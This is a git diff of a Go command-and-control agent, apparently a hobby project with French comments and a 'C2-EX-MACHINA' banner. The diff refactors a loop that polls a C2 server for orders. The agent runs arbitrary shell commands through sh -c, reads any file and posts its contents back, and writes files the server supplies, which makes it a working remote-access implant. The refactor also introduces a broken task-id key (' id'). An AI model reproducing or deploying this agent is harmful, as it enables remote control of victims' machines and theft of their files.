@@ -10,7 +10,85 @@ import (
 	"time"
 )
 
-func main() {
+/*
+   cette fonction permet de traiter les taches de type commande
+   elle retourne le stdout, le stderr et le status de la tache
+   elle retourne une erreur si la commande n'a pas pu etre executee
+*/
+func processCommandTask(task map[string]interface{}) (string, string, int, error) {
+	fmt.Println("startProcess")
+	cmd := exec.Command("sh", "-c", task["Data"].(string))
+	var stdout, stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+	err := cmd.Run()
+	if err != nil {
+		return "", "", cmd.ProcessState.ExitCode(), err
+	}
+	return stdout.String(), stderr.String(), cmd.ProcessState.ExitCode(), nil
+}
+
+/*
+   cette fonction permet de traiter les taches de type upload
+   elle retourne le stdout, le stderr et le status de la tache
+   elle retourne une erreur si le fichier n'a pas pu etre lu
+*/
+
+func processUploadTask(task map[string]interface{}) (string, string, int, error) {
+	fmt.Println("readFile")
+	fileContent, err := ioutil.ReadFile(task["Data"].(string))
+	if err != nil {
+		return "", "", 1, err
+	}
+	return string(fileContent), "", 0, nil
+}
+
+/*
+   cette fonction permet de traiter les taches de type download
+   elle retourne le stdout, le stderr et le status de la tache
+   elle retourne une erreur si le fichier n'a pas pu etre ecrit
+
+*/
+
+func processDownloadTask(task map[string]interface{}) (string, string, int, error) {
+	fmt.Println("writeFile")
+	err := ioutil.WriteFile(task["Filename"].(string), []byte(task["Data"].(string)), 0644)
+	if err != nil {
+		return "", "", 1, err
+	}
+	return "", "", 0, nil
+}
+
+/*
+   cette fonction permet de traiter les taches
+   elle retourne le stdout, le stderr et le status de la tache
+   elle retourne une erreur si le type de tache n'est pas reconnu
+*/
+
+func processTask(task map[string]interface{}) (string, string, int, error) {
+	switch task["Type"].(string) {
+	case "COMMAND":
+		return processCommandTask(task)
+	case "UPLOAD":
+		return processUploadTask(task)
+	case "DOWNLOAD":
+		return processDownloadTask(task)
+	}
+	return "", "", 1, fmt.Errorf("invalid task type")
+}
+
+/*
+   cette fonction permet de lancer l'agent
+   elle est appelee par la fonction main
+   elle contient une boucle infinie qui permet de traiter les taches
+   elle retourne une erreur si la requete n'a pas pu etre executee
+   le header de la requete contient l'api-key, le user-agent et le content-type
+   la requete GET permet de recuperer les taches a traiter
+   la requete POST permet d'envoyer les resultats des taches traitees
+
+*/
+
+func runAgent() {
 	fmt.Println("Defined variables")
 	var (
 		taskStdout string
@@ -65,65 +143,29 @@ func main() {
 
 		for _, task := range order["Tasks"].([]interface{}) {
 			fmt.Println("Process task")
-			switch task.(map[string]interface{})["Type"].(string) {
-			case "COMMAND":
-				fmt.Println("startProcess")
-				cmd := exec.Command("sh", "-c", task.(map[string]interface{})["Data"].(string))
-				var stdout, stderr bytes.Buffer
-				cmd.Stdout = &stdout
-				cmd.Stderr = &stderr
-				err := cmd.Run()
-				if err != nil {
-					panic(err)
-				}
-				taskStdout = stdout.String()
-				taskStderr = stderr.String()
-				taskStatus = cmd.ProcessState.ExitCode()
-				fmt.Println("waitForExit")
-			case "UPLOAD":
-				fmt.Println("readFile")
-				fileContent, err := ioutil.ReadFile(task.(map[string]interface{})["Data"].(string))
-				if err != nil {
-					panic(err)
-				}
-				taskStdout = string(fileContent)
-				taskStderr = ""
-				taskStatus = 0
-			case "DOWNLOAD":
-				fmt.Println("writeFile")
-				err := ioutil.WriteFile(task.(map[string]interface{})["Filename"].(string), []byte(task.(map[string]interface{})["Data"].(string)), 0644)
-				if err != nil {
-					panic(err)
-				}
-				taskStdout = ""
-				taskStderr = ""
-				taskStatus = 0
+			taskStdout, taskStderr, taskStatus, err = processTask(task.(map[string]interface{}))
+			if err != nil {
+				taskStatus = 1
+				taskStderr = err.Error()
 			}
-
 			fmt.Println("body add task result")
 			body = append(body, map[string]interface{}{
-				"id":     task.(map[string]interface{})["Id"].(float64),
+				"id":     task.(map[string]interface{})[" id"],
 				"stdout": taskStdout,
 				"stderr": taskStderr,
 				"status": taskStatus,
 			})
 		}
 
-		nextRequestTime := int(order["NextRequestTime"].(float64))
-		timeToSleep := nextRequestTime - int(time.Now().Unix())
-
-		fmt.Println("Sleeping for ", timeToSleep, " seconds")
-		time.Sleep(time.Duration(timeToSleep) * time.Second)
-
 		fmt.Println("Add headers request 2")
-		jsonData, err := json.Marshal(map[string]interface{}{
-			"tasks": body, "data": order["Data"], "id": order["Id"], "nextRequestTime": order["NextRequestTime"], "status": order["Status"],	
+		jsonData, err = json.Marshal(map[string]interface{}{
+			"tasks": body,
 		})
 		if err != nil {
 			panic(err)
 		}
 
-		req, err := http.NewRequest("POST", "http://127.0.0.1:8000/c2/order/01223456789abcdef", bytes.NewBuffer(jsonData))
+		req, err = http.NewRequest("POST", "http://127.0.0.1:8000/c2/order/01223456789abcdef", bytes.NewBuffer(jsonData))
 		if err != nil {
 			panic(err)
 		}
@@ -131,8 +173,8 @@ func main() {
 		for key, value := range headers {
 			req.Header.Set(key, value)
 		}
-		
-		resp, err := client.Do(req)
+
+		resp, err = client.Do(req)
 		if err != nil {
 			panic(err)
 		}
@@ -145,5 +187,27 @@ func main() {
 		}
 
 		fmt.Println("Get content response 2")
+
+		time.Sleep(5 * time.Second)
 	}
 }
+
+/*
+   cette fonction permet de lancer l'agent
+   elle est appelee par la fonction main
+*/
+
+func main() {
+
+	fmt.Println(`
+	░█████╗░██████╗░░░░░░░███████╗██╗░░██╗░░░░░░███╗░░░███╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░█████╗░
+	██╔══██╗╚════██╗░░░░░░██╔════╝╚██╗██╔╝░░░░░░████╗░████║██╔══██╗██╔══██╗██║░░██║██║████╗░██║██╔══██╗
+	██║░░╚═╝░░███╔═╝█████╗█████╗░░░╚███╔╝░█████╗██╔████╔██║███████║██║░░╚═╝███████║██║██╔██╗██║███████║
+	██║░░██╗██╔══╝░░╚════╝██╔══╝░░░██╔██╗░╚════╝██║╚██╔╝██║██╔══██║██║░░██╗██╔══██║██║██║╚████║██╔══██║
+	╚█████╔╝███████╗░░░░░░███████╗██╔╝╚██╗░░░░░░██║░╚═╝░██║██║░░██║╚█████╔╝██║░░██║██║██║░╚███║██║░░██║
+	░╚════╝░╚══════╝░░░░░░╚══════╝╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═╝░░╚═╝`)
+	time.Sleep(4 * time.Second)
+	runAgent()
+}
+
+/*petit text funky pour faire jolie @bybl4ck4rch*/
